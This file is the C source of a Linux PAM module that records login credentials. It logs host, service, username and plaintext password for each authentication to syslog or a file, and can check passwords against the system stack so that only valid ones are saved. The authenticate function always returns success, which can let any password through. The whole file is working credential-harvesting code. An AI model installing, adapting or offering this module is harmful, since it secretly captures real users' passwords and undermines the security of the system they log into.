/*
 *  Written by José Miguel Silva Caldeira <miguel@ncdc.pt> 2017/05/22
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program - see the file LICENSE.
 *
 * As figuras imaginárias têm mais relevo e verdade que as reais.
 * "Fernando Pessoa"
 */

/* --- includes --- */
#include <stdio.h>
#include <string.h>   /* strcmp,strncpy,... */
#include <stdlib.h>   /* calloc, setenv, putenv */

#include <security/pam_appl.h>  /* pam_* */
#include <security/pam_modules.h>

#include <log_credentials_common.h>


int log_only_good_credencials=0;


/* internal helper functions */
int mod_options(int argc, const char **argv){
								int i;
								for (i = 0; i < argc; i++) {
																if (strcmp(argv[i], "onlytrueusers") == 0) {
																								log_only_good_credencials=1;
																								continue;
																}
																if (strncmp(argv[i], "file=", 5) == 0) {
																								use_syslog=0;
																								log_filename = malloc(strlen(argv[i]) + 1 );
																								strcpy( log_filename, argv[i] + 5);
																								continue;
																}
								}
								return 0;
}

static int pam_set_authtok(pam_handle_t *pamh, int flags, int argc, const char **argv, char *prompt, int authtok){
								int retval;
								struct pam_message message[1],*pam_msg[1];
								struct pam_response *response = NULL;
								struct pam_conv *conversation;

								pam_msg[0] = &message[0];
								message[0].msg_style = PAM_PROMPT_ECHO_OFF;
								message[0].msg = prompt;

								retval = pam_get_item(pamh, PAM_CONV, (const void **)(void *) &conversation);
								if (retval == PAM_SUCCESS) {
																retval = conversation->conv(1, (const struct pam_message **) pam_msg, &response, conversation->appdata_ptr);
																if (retval == PAM_SUCCESS) {
																								if ((flags & PAM_DISALLOW_NULL_AUTHTOK) && response[0].resp == NULL) {
																																free(response);
																																return PAM_AUTH_ERR;
																								}else{
																																retval = pam_set_item(pamh, authtok, response[0].resp);
																																free(response);
																																return retval;
																								}
																}else{
																								pam_syslog(LOG_INFO, "conversation returned error: %s", pam_strerror(pamh,retval));
																								return retval;
																}
								}else{
																pam_syslog(LOG_INFO, "pam_get_item(conversation) returned error: %s", pam_strerror(pamh,retval));
																return retval;
								}
}

struct pam_response *pam_response_reply;

int conversation_helper_func(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr){
								*resp = pam_response_reply;
								return PAM_SUCCESS;
}

int verify_credentials(const char *username, const char *password){
								const struct pam_conv conversation_helper = {conversation_helper_func, NULL};
								pam_handle_t *local_auth_handle = NULL;

								int retval;

								char service_name[150];
								sprintf(service_name, "%s", "password-auth");

								retval = pam_start(service_name, username, &conversation_helper, &local_auth_handle);
								if (retval != PAM_SUCCESS) {
																return 1;
								}

								pam_response_reply = (struct pam_response *)malloc(sizeof(struct pam_response));
								pam_response_reply[0].resp = strdup(password);
								pam_response_reply[0].resp_retcode = 0;
								retval = pam_authenticate(local_auth_handle, 0);

								if (retval != PAM_SUCCESS) {
																return 1;
								}

								retval = pam_end(local_auth_handle, retval);

								if (retval != PAM_SUCCESS) {
																return 1;
								}

								return 0;
}

/* --- authentication management functions --- */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
								int retval, i;
								char *password;
								char *host;
								char *username;
								char *service;

								mod_options(argc, argv);

								retval=pam_get_item(pamh, PAM_SERVICE, (void*) &service);
								if(retval != PAM_SUCCESS) {
																pam_syslog(LOG_INFO, "pam_get_item(service) returned error: %s", pam_strerror(pamh,retval));
								}

								retval=pam_get_item(pamh, PAM_USER, (void*) &username);
								if(retval != PAM_SUCCESS) {
																pam_syslog(LOG_INFO, "pam_get_item(username) returned error: %s", pam_strerror(pamh,retval));
								}

								retval=pam_get_item(pamh, PAM_RHOST, (void*) &host);
								if(retval != PAM_SUCCESS) {
																pam_syslog(LOG_INFO, "pam_get_item(host) returned error: %s", pam_strerror(pamh,retval));
								}else{
																if(host==NULL) {
																								host="localhost";
																}
								}

								/* --- get password --- */
								retval=pam_get_item(pamh, PAM_AUTHTOK, (void*) &password);

								if (!password) {
																retval = pam_set_authtok(pamh, flags, argc, argv, "Password: ", PAM_AUTHTOK);
																if(retval != PAM_SUCCESS) {
																								pam_syslog(LOG_INFO, "pam_get_item(password) returned error: %s", pam_strerror(pamh,retval));
																}else{
																								retval=pam_get_item(pamh, PAM_AUTHTOK, (void*) &password);
																								if(retval != PAM_SUCCESS) {
																																pam_syslog(LOG_INFO, "pam_get_item(password) returned error: %s", pam_strerror(pamh,retval));
																								}
																}
								}

								if(log_only_good_credencials==1) {
																if(verify_credentials(username, password)==0) {
																								if(use_syslog==1) {
																																pam_syslog(LOG_INFO,"host=%s service=%s user=%s pass=%s", host, service, username, password);
																								}else{
																																pam_filelog(host, service, username, password);
																								}
																}

																free(log_filename);
																return PAM_SUCCESS;
								}

								if(use_syslog==1) {
																pam_syslog(LOG_INFO,"host=%s service=%s user=%s pass=%s", host, service, username, password);
								}else{
																pam_filelog(host, service, username, password);
								}

								free( log_filename );
								return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv){
								return PAM_SUCCESS;
}
